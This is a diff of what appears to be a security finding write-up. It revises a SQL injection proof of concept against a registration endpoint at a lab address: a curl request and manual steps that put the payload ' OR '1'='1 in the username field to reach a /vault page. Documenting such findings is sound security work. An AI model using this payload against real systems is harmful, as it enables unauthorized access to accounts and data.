@@ -127,7 +127,7 @@ The registration endpoint accepts unsanitized user input in the username field, 
 ```bash
 curl -X POST http://10.0.0.10/register \
   -H "Content-Type: application/json" \
-  -d '{"username":"test' OR '1'='1","password":"Password123!"}'
+  -d '{"username":"' OR '1'='1","password":"Password123!"}'
 ```
 
 **Response:**
@@ -177,11 +177,7 @@ curl -X POST http://10.0.0.10/register \
 2. Click "Sign Up" button to open registration modal.
 3. In username field, enter: `' OR '1'='1`
 4. In password field, enter: `Password123!`
-5. Click "Sign Up" button.
-6. Observe success alert: "Registration successful!"
-7. Click "Log In" button.
-8. Enter username: `' OR '1'='1` and password: `Password123!`
-9. Click "Log In" - should redirect to /vault.
+5. Click "Sign Up" button, observe success alert, then click "Log In", enter the same username/password, and verify redirect to /vault.
 
 **Step 1 Screenshot:** Registration modal with SQL payload in username field
 
